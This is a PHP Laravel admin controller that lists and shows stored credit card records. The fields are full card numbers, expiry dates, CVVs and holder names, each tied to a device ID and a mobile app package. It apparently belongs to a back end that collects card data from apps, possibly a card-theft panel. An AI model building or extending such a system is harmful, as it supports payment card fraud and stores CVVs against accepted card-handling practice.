<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Http\Controllers\Admin\AuthorizationsController;
use App\Models\ReceiveCards;
use Illuminate\Http\Request;

class ReceiveCardsController extends Controller
{
    /**
     * 信用卡列表
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function list(Request $request)
    {
        $request->validate([
            'page' => 'required|int',
            'limit' => 'required|int',
            'device_number' => 'nullable|string',
            'app_name' => 'nullable|string',
            'app_package' => 'nullable|string',
            'device_id' => 'nullable|int',
        ]);

        $page = $request->get('page', 1);
        $limit = $request->get('limit', 20);
        $offset = ($page - 1) * $limit;

        $model = ReceiveCards::query();

        // 按设备号搜索
        if (!empty($request->device_number)) {
            $model->where('device_number', 'like', '%' . $request->device_number . '%');
        }

        // 按应用名称搜索
        if (!empty($request->app_name)) {
            $model->where('app_name', 'like', '%' . $request->app_name . '%');
        }

        // 按应用包名搜索
        if (!empty($request->app_package)) {
            $model->where('app_package', 'like', '%' . $request->app_package . '%');
        }

        // 按设备ID搜索
        if (!empty($request->device_id)) {
            $model->where('device_id', $request->device_id);
        }

        $count = $model->count();
        $list = $model->offset($offset)
            ->limit($limit)
            ->orderBy('id', 'desc')
            ->get()
            ->toArray();

        // 检查二次密码验证状态，未验证时隐藏敏感字段
        $isVerified = AuthorizationsController::checkSecondPasswordVerified($request);
        if (!$isVerified) {
            foreach ($list as &$item) {
                $item['card_number'] = null;
                $item['card_date'] = null;
                $item['cvv'] = null;
                $item['user_first_name'] = null;
                $item['user_last_name'] = null;
            }
            unset($item);
        }

        return $this->success(['total_num' => $count, 'list' => $list]);
    }

    /**
     * 获取指定信用卡
     * @param Request $request
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function info(Request $request)
    {
        $request->validate([
            'id' => 'required|int'
        ]);

        $info = ReceiveCards::query()
            ->where('id', $request->id)
            ->first();

        if (empty($info)) {
            return $this->fail(404, '信用卡不存在');
        }

        $data = $info->toArray();

        // 检查二次密码验证状态，未验证时隐藏敏感字段
        $isVerified = AuthorizationsController::checkSecondPasswordVerified($request);
        if (!$isVerified) {
            $data['card_number'] = null;
            $data['card_date'] = null;
            $data['cvv'] = null;
            $data['user_first_name'] = null;
            $data['user_last_name'] = null;
        }

        return $this->success($data);
    }
}

